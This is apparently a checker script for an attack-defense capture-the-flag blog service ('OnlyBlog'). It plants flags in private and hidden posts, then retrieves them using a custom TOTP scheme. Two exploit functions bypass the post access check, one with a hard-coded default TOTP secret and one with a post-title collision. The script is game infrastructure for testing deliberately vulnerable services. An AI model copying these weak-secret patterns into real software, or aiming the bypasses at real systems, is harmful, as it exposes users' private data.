import secrets
import string
import hashlib
import hmac
from faker import Faker
from typing import List, Optional, Tuple
from bs4 import BeautifulSoup
from datetime import timezone
import datetime
from logging import LoggerAdapter

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    FlagSearcher,
    BaseCheckerTaskMessage,
    PutflagCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    InternalErrorException,
    PutflagCheckerTaskMessage,
    AsyncSocket,
)
from enochecker3.utils import FlagSearcher, assert_equals, assert_in
from httpx import AsyncClient, Request, Response

"""

"""
SERVICE_PORT = 5000
checker = Enochecker("OnlyBlog", SERVICE_PORT)
app = lambda: checker.app
"""

"""

party_word_list = ['party', 'event', 'rave', 'disco', 'festival', 'loveparade', 'christopher-street-day', 'csd',
                   'great', 'huge', 'massive', 'fun', 'experience', 'parade', 'street', 'city', 'the best',
                   'social', 'gathering', 'celebrate', 'birthday', 'anniversary', 'club', 'fiesta', 'dance',
                   'bash', 'fete', 'beach', 'reunion', 'after party', 'techno', 'house', 'tekktonik', 'classic'
                   'pool party', 'surprise', 'underground', 'Birgit & Bier', 'Tresor', 'Berghain', 'East',
                   'Anomalie', 'Club-Ost', 'Panorama Bar', 'Sisyphos', 'KitKat', 'Carnival', 'Berlin']

class Totp_Client:
    def __init__(self,
                 init_time,
                 num_digits: int=6):

        self.secret_key = ""
        self.init_time = init_time
        self.timestep = 30
        self.timestep_counter = 0
        if num_digits > 10 or num_digits < 6:
            raise ValueError("The number of digits for the OTP must be between 6 and 10")
        self.num_digits = num_digits

    def generate_shared_secret(self, secret: str=""):
        if not secret:
            if not self.secret_key:
                secret_phrase = "Correct horse battery staple!"
                secret_key_tmp = hashlib.sha256(self.secret_phrase.encode())
                self.secret_key = secret_key_tmp.digest()
        else:
            if not self.secret_key:
                secret_key_tmp = hashlib.sha256(secret.encode())
                self.secret_key = secret_key_tmp.digest()
        return

    def force_secret_override(self, new_secret):
        secret_key_tmp = hashlib.sha256(new_secret.encode())
        self.secret_key = secret_key_tmp.digest()
        return

    def generate_otp(self, shared_secret: bytes, timestep_counter: int):
        hmac_result = hmac.new(shared_secret, bytes(timestep_counter), hashlib.sha1)
        bin_code = self.truncate(bytearray(hmac_result.digest()))
        return int(bin_code) % 10**self.num_digits

    #return 4 byte/31 bit value
    def truncate(self, hmac_result: bytearray):
        offset = hmac_result[-1] & 0xf
        bin_code = ( (hmac_result[offset] & 0x7f) << 24
                    |(hmac_result[offset+1] & 0xff) << 16
                    |(hmac_result[offset+2] & 0xff) << 8
                    |(hmac_result[offset+3] & 0xff)
                    )
        return bin_code

    def calculate_current_timestep_count(self):
        dt = datetime.datetime.now(timezone.utc)
        time_diff = int(dt.timestamp()) - int(self.init_time) # floor the diff or fllor individually?

        if time_diff < 0:
            self.timestep_counter = 0
        else:
            steps = int(time_diff/self.timestep)
            self.timestep_counter = steps
        return


async def register_user(client: AsyncClient, logger):
    fake = Faker()
    username = fake.first_name()#''.join(secrets.choice(string.ascii_letters+string.digits) for i in range(10))
    password = ''.join(secrets.choice(string.ascii_letters+string.digits) for i in range(25))
    logger.debug(f"New user registration. Username: {username}, Password: {password}")

    formdata = {"username": username, "password": password, "rpassword": password}
    r = await client.post("/auth/register", data=formdata)
    assert_equals(r.status_code, 302, "Registration error in register user function.")
    return username, password

async def login_user(client, logger, username, password):
    logger.debug(f"Logging in user: {username}, with password: {password}")
    formdata = {"username": username, "password": password}
    r = await client.post("auth/login", data=formdata)
    assert_equals(r.status_code, 302, "Login Error in login_user function.")
    logger.debug(f"Successfully loggen in user: {username}, with password: {password}")
    return r.cookies

async def create_blogpost(client, logger, cookie, flag, is_private, is_hidden, inviteduser="", title="", isexploit=False):
    fake = Faker()
    secret = ''.join(secrets.choice(string.ascii_letters+string.digits) for i in range(25))
    body = flag
    if not title:
        #title = ''.join(secrets.choice(string.ascii_letters+string.digits) for i in range(25))
       title = fake.text(max_nb_chars=35, ext_word_list=party_word_list)
    formdata = {"title": title, "body": body, "inviteuser": inviteduser, "secret phrase": secret}

    if is_private:
        formdata["private"] = "True"
    if is_hidden:
        formdata["hidden"] = "True"

    r = await client.post("/create", data=formdata, cookies=cookie)
    if isexploit:
        assert_equals(r.status_code, 200, "Blogpost creation error in create_blogpost function -- for exploit")
    else:
        assert_equals(r.status_code, 302, "Blogpost creation error in create_blogpost function.")
        if is_hidden:
            f = await client.get(r.headers['Location'], cookies=cookie)
            # parse html to get the post_id
            html = BeautifulSoup(f.text, "html.parser")
            article = html.find('article', attrs={"class":"post"})
            el_a = article.find('a', attrs={"class":"action"})
            postid = el_a['href'].split('/')[1]
            logger.debug(f"postid is: {postid}")
            return title, secret, postid

    return title, secret

async def logout_user(client, logger, username, cookie):
    r = await client.get('auth/logout', cookies=cookie)
    logger.debug(f"logged out: {username}")
    assert_equals(r.status_code, 302, "Logout did not redirect to index")
    return

# Deposit a flag in a private user post.
# Puts the post title attackinfgo
@checker.putflag(0)
async def putflag_zero(
    task: PutflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> str:
    """
    TODO:
        - register a user and store credentials
        - login as user with valid username, password
        - register another user and invite him
        - create a new blogpost with a valid title, put the flag as the body and make it private
        - logout
    """
    flag = task.flag
    author, apassword = await register_user(client, logger)
    authorcookie = await login_user(client, logger, author, apassword)
    user_to_invite, upassword = await register_user(client, logger)

    title, secret = await create_blogpost(client, logger, authorcookie, flag, is_private=True, is_hidden=False, inviteduser=user_to_invite, title="")
    await logout_user(client, logger, author, authorcookie)

    await db.set("nec_info", (title, user_to_invite, upassword))
    return str(title)

# Deposit a flag in a hidden user post.
@checker.putflag(1)
async def putflag_one(
    task: PutflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB,
) -> str:
    """
    TODO:
        - register a user and store credentials
        - login as user with valid username, password
        - register another user and invite him
        - create a new blogpost with a valid title, put the flag as the body and make it private
        - logout
    """
    flag = task.flag
    author, apassword = await register_user(client, logger)
    authorcookie = await login_user(client, logger, author, apassword)
    user_to_invite, upassword = await register_user(client, logger)

    title, secret, postid= await create_blogpost(client, logger, authorcookie, flag, is_private=False, is_hidden=True, inviteduser=user_to_invite, title="")
    await logout_user(client, logger, author, authorcookie)

    await db.set("nec_info", (title, user_to_invite, upassword, secret))
    return str(postid)

@checker.putnoise(0)
async def putnoise_register(
        db: ChainDB,
        client: AsyncClient,
        logger: LoggerAdapter
) -> None:
    username, password = await register_user(client, logger)
    await db.set("reg_info", (username, password))

@checker.getnoise(0)
async def getnoise_login_logout(
        db: ChainDB,
        client: AsyncClient,
        logger: LoggerAdapter
) -> None:

    try:
        username, password = await db.get("reg_info")
    except KeyError:
        raise MumbleException("Missing database entry from putflag operation.")

    cookie = await login_user(client, logger, username, password)
    r = await client.get('/auth/accountInfo', cookies=cookie)
    assert_equals(r.status_code, 200, "User unable to access acount Information")

def getdata_from_accountinfo(response, client, logger, title):
    try:
        html = BeautifulSoup(response.text, "html.parser")
        el_article = html.find_all('article', attrs={"class":"post"})

        for article in el_article:
            el_h4 = article.find('h4')
            if el_h4 is None:
                break
            ftitle = el_h4.string
            ftitle = ftitle.split("to: ")[1]

            if ftitle == title:
                el_div_date = article.find("div", attrs={"class":"about"})
                date = el_div_date.string
                date = date.split(": ")[1]

                el_div_postkey = article.find("div", attrs={"class":"totp-info"})
                postkey = el_div_postkey.string
                postkey = postkey.split("event key is: ")[1]

                el_a = article.find('a', attrs={"class":"action"})
                posturl = el_a['href']
                return date, postkey, posturl

        raise MumbleException("relevant data could not be retrieved from Account Info...")
    except:
        msg = f"post with title {title} could not be found"
        raise MumbleException(msg)


"""
    TODO:
        - retrieve valid credentials from DB
        - login as the user and view your account info
        - find the event with the given title and parse time and key
        - access the desired post
        - retrieve the flag from the posts body
"""
@checker.getflag(0)
async def getflag_zero(
    task: GetflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB
) -> None:

    try:
        userdata = await db.get("nec_info")
    except KeyError:
        #is mumble here correct or will lead to deduction in points?
        raise MumbleException("Missing database entry from putflag operation.")

    cookie = await login_user(client, logger, username=userdata[1], password=userdata[2])
    r = await client.get('/auth/accountInfo', cookies=cookie)
    logger.debug(f"accessing accountinfo: {r.text}")
    date, postkey, posturl = getdata_from_accountinfo(r, client, logger, userdata[0])
    timestamp = convert_str_to_unixtimestamp(date, True)

    totp_device = Totp_Client(init_time=timestamp)
    totp_device.generate_shared_secret(postkey)
    totp_device.calculate_current_timestep_count()
    usercode = totp_device.generate_otp(totp_device.secret_key, totp_device.timestep_counter)
    logger.debug(f"accessing post: {userdata[0]}, timestamp: {timestamp}, usercode: {usercode}")

    r = await client.post(posturl, data={"code":usercode}, cookies=cookie)
    logger.debug(f"response: {r.text}")
    assert_in(task.flag, r.text, "The flag could not be retrieved in the getflag method.")

    await logout_user(client, logger, userdata[0], cookie)
    return

@checker.getflag(1)
async def getflag_one(
    task: GetflagCheckerTaskMessage,
    logger: LoggerAdapter,
    client: AsyncClient,
    db: ChainDB
) -> None:

    try:
        userdata = await db.get("nec_info")
    except KeyError:
        #is mumble here correct or will lead to deduction in points?
        raise MumbleException("Missing database entry from putflag operation.")

    cookie = await login_user(client, logger, username=userdata[1], password=userdata[2])
    r = await client.get('/auth/accountInfo', cookies=cookie)
    logger.debug(f"accessing accountinfo: {r.text}")
    date, postkey, posturl = getdata_from_accountinfo(r, client, logger, userdata[0])
    timestamp = convert_str_to_unixtimestamp(date, True)

    totp_device = Totp_Client(init_time=timestamp)
    totp_device.generate_shared_secret(postkey)
    totp_device.calculate_current_timestep_count()
    usercode = totp_device.generate_otp(totp_device.secret_key, totp_device.timestep_counter)
    logger.debug(f"accessing post: {userdata[0]}, timestamp: {timestamp}, usercode: {usercode}")

    r = await client.post(posturl, data={"code":usercode}, cookies=cookie)
    logger.debug(f"response: {r.text}")
    assert_in(task.flag, r.text, "The flag could not be retrieved in the getflag method.")

    await logout_user(client, logger, userdata[0], cookie)
    return

#find timestamp and postid for post given by title
def finddata_for_exploit(r, username, title):
    try:
        html = BeautifulSoup(r.text, "html.parser")
        el_article = html.find_all('article', attrs={"class":"post"})
        if len(el_article) < 1:
            raise MumbleException("No article to apply explouit to...")

        for article in el_article:
            el_h1 = article.find('h1')

            if el_h1.string == title:
                el_div = article.find("div", attrs={"class":"about"})
                spliddy = el_div.string.split(' ')
                time = spliddy[-2:]

                el_a = article.find('a', attrs={"class":"action"})
                posturl = el_a['href']
                return time, posturl
    except:
        msg = f"post with id {postid} could not be found"
        raise MumbleException(msg)


def convert_str_to_unixtimestamp(time, isstring):
    date = None
    timec = None

    if isstring:
        date, timec = time.split(' ', 1)
    else:
        date = time[0]
        timec = time[1]

    datecomp=date.split('-')
    timecomp=timec.split(':')
    if len(timecomp) == 2:
        #create new aware datetime object from date and time components, note that we do not have seconds.
        dto = datetime.datetime(int(datecomp[0]), int(datecomp[1]), int(datecomp[2]), int(timecomp[0]), int(timecomp[1]), tzinfo=timezone.utc)
        return dto.timestamp()
    elif len(timecomp) == 3:
        dto = datetime.datetime(int(datecomp[0]), int(datecomp[1]), int(datecomp[2]), int(timecomp[0]), int(timecomp[1]), int(timecomp[2]), tzinfo=timezone.utc)
        return dto.timestamp()
    else:
        raise MumbleException("Unexpected timestamp format!")


@checker.exploit(0)
async def exploit_zero(task: ExploitCheckerTaskMessage,
                       searcher: FlagSearcher,
                       client: AsyncClient,
                       logger: LoggerAdapter
                       ) -> Optional[str]:

    if task.attack_info == "":
        raise InternalErrorException("Missing attack info for exploit")
    title = task.attack_info

    username, password  = await register_user(client, logger)
    cookie = await login_user(client, logger, username, password)
    r = await client.get("/", cookies=cookie)

    # use the title to find relevant info
    time, posturl = finddata_for_exploit(r, username, title)
    default_key = "Correct horse battery staple!"
    #first timestamp is always ON THE MINUTE, the second is ON EVERY HALF-MINUTE
    timestamp = int(convert_str_to_unixtimestamp(time, False))
    totp_device = Totp_Client(init_time=timestamp)
    totp_device.generate_shared_secret(default_key)
    totp_device.calculate_current_timestep_count()

    rangep = int(60/totp_device.timestep)
    for i in range(rangep+1):
        usercode = totp_device.generate_otp(totp_device.secret_key, totp_device.timestep_counter)
        r = await client.post(posturl, data={"code":usercode}, cookies=cookie)
        logger.debug(f"response: {r.text}")
        if flag := searcher.search_flag(r.text):
            return flag

        totp_device.init_time = totp_device.init_time+totp_device.timestep
        totp_device.calculate_current_timestep_count()

    raise MumbleException("Flag not found in exploit")

@checker.exploit(1)
async def exploit_one(task: ExploitCheckerTaskMessage,
                       searcher: FlagSearcher,
                       client: AsyncClient,
                       logger: LoggerAdapter
                       ) -> Optional[str]:
    """
    TODO:
        - register a new user
        - login as the new user with valid credentials and totp
        - access the private event by
            - reading the creation time and creating a timestamp from it
            - generating the secret key
            - calculating the totp.
    """
    if task.attack_info == "":
        raise InternalErrorException("Missing attack info for exploit")
    postid = task.attack_info

    inviter, ipassword  = await register_user(client, logger)
    guest, gpassword = await register_user(client, logger)

    cookie = await login_user(client, logger, inviter, ipassword)
    r = await client.get("/auth/accessblogpost/"+str(postid), cookies=cookie)
    html = BeautifulSoup(r.text, "html.parser")
    content = html.find('section', attrs={"class":"content"})
    heading = content.find('h1').string
    title = heading.split(' ')[0]
    logger.debug(f"the title is: {title}")
    title, secret = await create_blogpost(client, logger, cookie, "some text", is_private=True, is_hidden=False, inviteduser=guest, title=title, isexploit=True)
    await logout_user(client, logger, inviter, cookie)

    guestcookie = await login_user(client, logger, guest, gpassword)
    r = await client.get('/auth/accountInfo', cookies=guestcookie)
    date, postkey, posturl = getdata_from_accountinfo(r, client, logger, title)

    #first timestamp is always ON THE MINUTE, the second is ON EVERY HALF-MINUTE
    timestamp = int(convert_str_to_unixtimestamp(date, True))
    totp_device = Totp_Client(init_time=timestamp)
    totp_device.generate_shared_secret(postkey)
    totp_device.calculate_current_timestep_count()
    usercode = totp_device.generate_otp(totp_device.secret_key, totp_device.timestep_counter)

    r = await client.post(posturl, data={"code":usercode}, cookies=cookie)
    logger.debug(f"response: {r.text}")
    if flag := searcher.search_flag(r.text):
        return flag

    raise MumbleException("Flag not found in exploit")
